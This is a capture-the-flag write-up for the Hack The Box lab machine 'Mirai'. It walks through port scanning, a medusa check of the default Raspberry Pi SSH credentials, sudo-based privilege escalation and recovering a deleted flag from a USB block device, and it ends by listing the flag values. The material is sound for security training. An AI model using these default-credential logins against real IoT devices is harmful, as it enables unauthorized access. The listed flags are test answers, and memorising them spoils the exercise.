# Mirai - Easy

```shell
sudo vim /etc/hosts
#add mirai.htb

nmap -T4 -p- -A -Pn -v mirai.htb

dig @mirai.htb pi.hole
#check domain

sudo vim /etc/hosts
#add pi.hole

#confirm if default SSH creds used
medusa -h mirai.htb -u pi -p raspberry -M ssh
#it works

ssh pi@mirai.htb

#get user flag from Desktop

sudo -l
#we can run all commands as all users

sudo su -
#root shell

cat root.txt
#does not contain root flag
#we have to look for usb backups

ls -la /media

ls -la /media/usbstick

cat /media/usbstick/damnit.txt
#the root flag has been deleted
#we have to check somewhere else

lsblk
#shows usbstick - /dev/sdb

strings /dev/sdb
#we get root flag here
```

* Open ports & services:

  * 22 - ssh - OpenSSH 6.7p1 Debian
  * 53 - domain - dnsmasq 2.76
  * 80 - http - lighttpd 1.4.35
  * 1895 - upnp - Platinum UPnP 1.0.5.13
  * 32400 - http - Plex Media Server httpd
  * 32469 - upnp - Platinum UPnP 1.0.5.13

* The webpage on port 80 when visited shows "Website Blocked" message.

* This page also includes info ```Pi-hole v3.1.4```, which seems to be related to a IoT device.

* Checking the webpage on port 32400 leads us to the login page for ```Plex```; we do not have creds so we can check this one later.

* Now, going back to the page on port 80, its source code includes a domain <pi.hole>

* As we have a DNS server on port 53, we can attempt to check this domain using dig query - we get an affirmative response.

* We can add this domain to /etc/hosts

* Now, if we visit <http://pi.hole>, we get redirected to <http://pi.hole/admin>; this includes a login section.

* We can attempt to login, but it does not work.

* As it is using ```Pi-hole```, it is highly likely that it is running on a ```Raspberry Pi```.

* We can try using the default SSH creds "pi:raspberry" for logging in; we can confirm using ```medusa```.

* It shows success, so we can login as 'pi' using SSH.

* We can get user flag from the Desktop.

* ```sudo -l``` shows that we can run all commands as all users.

* We can get root shell using ```sudo su -```.

* However, reading 'root.txt' does not give us the flag; it gives the following message:

```I lost my original root.txt! I think I may have a backup on my USB stick...```

* USB devices can be found in /media usually, so we can check there.

* The /media/usbstick folder contains a note saying that the flag has been deleted; we have to get it back.

* Now, using ```lsblk```, we can list block devices, and see that 'usbstick' device corresponds to ```/dev/sdb```.

* Running ```strings``` on ```/dev/sdb``` gives us the root flag.

```markdown
1. User flag - ff837707441b257a20e32199d7c8838d

2. Root flag - 3d3e483143ff12ec505d026fa13e020b
```
